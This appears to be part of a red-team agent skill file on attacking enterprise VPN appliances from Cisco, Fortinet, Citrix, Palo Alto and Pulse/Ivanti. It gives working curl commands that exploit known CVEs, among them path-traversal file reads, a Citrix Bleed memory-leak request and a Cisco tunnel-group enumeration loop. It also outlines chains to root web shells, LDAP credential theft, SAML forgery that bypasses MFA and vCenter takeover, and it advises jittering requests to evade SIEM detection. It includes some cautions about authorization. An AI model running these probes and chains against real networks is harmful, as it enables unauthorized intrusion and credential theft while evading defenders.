# enterprise-vpn-attack — 全文续篇

> 主卡保留前 5 节；本文件从第 6 节起。原文件：`/root/.hermes/skills/security/enterprise-vpn-attack/SKILL.md`

## Group / tunnel-group enumeration (Cisco-specific)

Cisco ASA AAA groups can sometimes be enumerated without auth.

```bash
# Tunnel group enumeration via timing
for group in DefaultRAGroup DefaultWEBVPNGroup SSLVPN Employees Contractors Vendors Partners Sales Marketing IT; do
  ms=$(curl -sk --max-time 10 --connect-timeout 10 -o /dev/null -w "%{time_total}" \
    -X POST "https://target/+webvpn+/index.html" \
    -d "username=test&password=test&group_list=$group&tgroup=&Login=Login")
  echo "$group: ${ms}s"
done
# Larger differential timing = group exists; valid groups respond slower in some builds
```

---

## AAA backend identification

After auth fails, look at error response details:

| Pattern in response | AAA backend |
|---|---|
| `a0=2` (Cisco) | Unknown user |
| `a0=3` (Cisco) | Wrong password |
| `a0=4` (Cisco) | Login restricted |
| `a0=12` (Cisco) | Account locked |
| `a0=115` (Cisco) | Generic auth fail (LDAP/RADIUS/AD layer error) |
| AADSTS in response body | Backed by Entra (SAML) |
| `Authentication failed via RADIUS` | RADIUS backend |
| `Invalid username or password` (generic) | LDAP or local DB |

If you see SAML/Entra in the flow, pivot to `m365-entra-attack` skill for cred-spray strategy.

---

## Common probe sequence (5-minute fingerprint)

```bash
TARGET="vpn.target.com"

# Cisco
curl --max-time 30 --connect-timeout 10 -skI "https://$TARGET/+CSCOE+/logon.html" 2>&1 | head -3
curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/+CSCOE+/saml/sp/metadata" -o /tmp/cisco_saml.xml; ls -la /tmp/cisco_saml.xml
curl --max-time 30 --connect-timeout 10 -sk --path-as-is "https://$TARGET/+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest" -o /tmp/cisco_cve.html

# Fortinet
curl --max-time 30 --connect-timeout 10 -skI "https://$TARGET/remote/login" 2>&1 | head -3
curl --max-time 30 --connect-timeout 10 -sk --path-as-is "https://$TARGET/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession" -o /tmp/forti_cve.txt; head -c 200 /tmp/forti_cve.txt

# Citrix
curl --max-time 30 --connect-timeout 10 -skI "https://$TARGET/" 2>&1 | head -3
curl --max-time 30 --connect-timeout 10 -sk --path-as-is "https://$TARGET/vpn/../vpns/cfg/smb.conf" -o /tmp/citrix_cve.txt; head -c 200 /tmp/citrix_cve.txt
HOST=$(python3 -c "print('A' * 24812)")
curl --max-time 30 --connect-timeout 10 -sk -X POST -H "Host: $HOST" "https://$TARGET/oauth/idp/.well-known/openid-configuration" -o /tmp/citrix_bleed.txt
wc -c /tmp/citrix_bleed.txt

# Palo Alto
curl --max-time 30 --connect-timeout 10 -skI "https://$TARGET/global-protect/login.esp" 2>&1 | head -3

# Pulse / Ivanti
curl --max-time 30 --connect-timeout 10 -skI "https://$TARGET/dana-na/auth/url_default/welcome.cgi" 2>&1 | head -3
curl --max-time 30 --connect-timeout 10 -sk --path-as-is "https://$TARGET/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/" -o /tmp/pulse_cve.txt; head -c 200 /tmp/pulse_cve.txt
```

---

## Nuclei templates for fast triage

Nuclei has high-quality templates for most of the above CVEs. Single command sweeps:

```bash
nuclei -u https://target/ \
  -tags vpn,cisco-asa,fortinet,citrix,palo-alto,pulse-secure,sonicwall,f5 \
  -severity high,critical -rl 5
```

Add `-as` (auto-scan) for broader vuln coverage but slower.

---

## Operational discipline

- **Banner-stripped servers (no version disclosure)** are good defense-in-depth — record as positive finding even if no CVE found
- **Rate-limit yourself** — these appliances often log every request to a SIEM. Patient pace, jittered timing.
- **SAML metadata is anonymous** — pull it. It's intel about AAA backend.
- **Don't run pre-auth-RCE PoCs in red team without explicit OK** — accidentally bricking a VPN concentrator = catastrophic for the client. Detection-only tests first, then escalate with permission.
- **Document the AAA backend identification** — knowing whether ASA uses RADIUS-to-local vs SAML-to-Entra changes downstream attack paths.

---

## Verification

Run this self-test to confirm VPN appliance fingerprinting works:

1. **Cisco ASA fingerprint** — confirm path detection syntax:
   ```bash
   curl --max-time 30 --connect-timeout 10 -skI "https://vpn.example.com/+CSCOE+/logon.html" -o /dev/null -w "HTTP %{http_code}
" 2>/dev/null && echo "(test probe sent)"
   ```

2. **Fortinet path probe** — confirm FortiOS path syntax:
   ```bash
   curl --max-time 30 --connect-timeout 10 -skI "https://vpn.example.com/remote/login" -o /dev/null -w "HTTP %{http_code}
" 2>/dev/null && echo "(test probe sent)"
   ```

3. **CVE-2020-3452 probe syntax** — confirm Cisco file-read path construction:
   ```bash
   echo "https://target/+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest+/+CSCOT+/lua/test.lua" | grep -q "+CSCOE+" && echo "PASS: CVE path syntax correct" || echo "FAIL"
   ```

4. **CVE-2018-13379 probe syntax** — confirm Fortinet path-traversal construction:
   ```bash
   echo "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession" | grep -q "fgt_lang" && echo "PASS: Fortinet path syntax correct" || echo "FAIL"
   ```

5. **Citrix Bleed probe syntax** — confirm Host header overflow pattern:
   ```bash
   echo "POST /oauth/idp/.well-known/openid-configuration" | grep -q "openid-configuration" && echo "PASS: Citrix Bleed endpoint syntax correct" || echo "FAIL"
   ```

6. **SAML metadata probe** — confirm metadata endpoint syntax:
   ```bash
   echo "/+CSCOE+/saml/sp/metadata /remote/saml/metadata" | grep -q "saml" && echo "PASS: SAML metadata paths present" || echo "FAIL"
   ```

All 6 tests verify the VPN fingerprinting and CVE detection syntax.

---

## Bridge to neighboring skills

- `m365-entra-attack` — when AAA backend is Entra SAML; cred-spray strategy carries over
- `hunt-saml` — XSW / signature-stripping if SAML SP is misconfigured
- `mid-engagement-ir-detection` — appliances generate noisy logs; watch for IPS rules being deployed mid-engagement
- `redteam-mindset` — banner-stripped ≠ "not vulnerable"; keep digging via behavioral fingerprints

---

## Pitfalls

- **Don't conclude "patched" from a 404 on one CVE path** — patches deploy unevenly; test 3+ CVEs per vendor
- **Don't trust the version banner alone** — appliance vendors often backport fixes without bumping the version string
- **Don't run heavy nuclei scans without rate-limiting** — these appliances are critical infrastructure; use `-rl 5` or lower
- **Don't fingerprint by trying all CVE PoCs immediately** — start with non-disruptive HEAD + version-banner probes
- **Don't skip SAML metadata** — even when the appliance is patched, SAML SP misconfig is its own attack surface
- **Don't run pre-auth RCE PoCs without explicit authorization** — accidentally crashing a VPN concentrator is catastrophic. Detection-only tests first.
- **Don't trust HTTP status codes alone** — patched appliances may return 200 on known-vulnerable paths but serve different content. Diff the response body against a baseline.
- **Don't assume one vendor** — many enterprises run multiple VPN appliances (Cisco + Citrix, Fortinet + Pulse). Fingerprint all before selecting attack paths.
- **Don't ignore the AAA backend** — knowing whether the VPN uses RADIUS-to-local vs SAML-to-Entra changes downstream attack paths completely.
- **Lockout risk on default credentials** — most enterprise targets have changed factory passwords. Test ≤2 attempts per account.
- **VPN appliances generate noisy logs** — every probe is likely logged to SIEM. Jitter timing between requests; don't rapid-fire.



---

## Related Skills & Chains

- **`hunt-rce`** — Every major VPN appliance (Pulse Secure, Fortinet, Citrix, Ivanti, Palo Alto) has shipped pre-auth path-traversal-to-RCE in the last 24 months. Chain primitive: VPN appliance CVE (e.g., Ivanti ICS CVE-2024-21887, Citrix Bleed CVE-2023-4966, Fortinet CVE-2024-21762) → `hunt-rce` pre-auth path traversal → arbitrary file write into web-root → request the file → web-shell as `root` → VPN config + LDAP bind credentials extracted.
- **`hunt-saml`** — VPN SAML SP misconfig persists even on fully-patched appliances. Chain primitive: appliance patched against latest CVE but `/saml/metadata` reachable → IdP fingerprinted → `hunt-saml` XSW or comment-injection against IdP → forged assertion → VPN session established without password/MFA.
- **`vmware-vcenter-attack`** — Post-VPN-foothold the natural next pivot is vCenter. Chain primitive: VPN web-shell → cred extraction from VPN appliance config (LDAP bind, RADIUS shared secret) → reuse against internal vCenter → if scope permits, `vmware-vcenter-attack` → datacenter takeover.
- **`hunt-ntlm-info`** — Some VPN appliances expose anonymous NTLM on management paths. Chain primitive: VPN admin portal NTLM Type-2 capture → `hunt-ntlm-info` AV_PAIR decode → internal AD forest name → `m365-entra-attack` Entra spray on synced tenant.
- **`mid-engagement-ir-detection`** + **`redteam-report-template`** — VPN appliance CVE exploitation is high-noise; SOC patches fast. Chain primitive: confirmed CVE → baseline capture via `mid-engagement-ir-detection` → if appliance updates mid-test, capture the patched-state as a SECOND finding → run both findings through `triage-validation` → package via `redteam-report-template` with explicit critical-infrastructure framing.

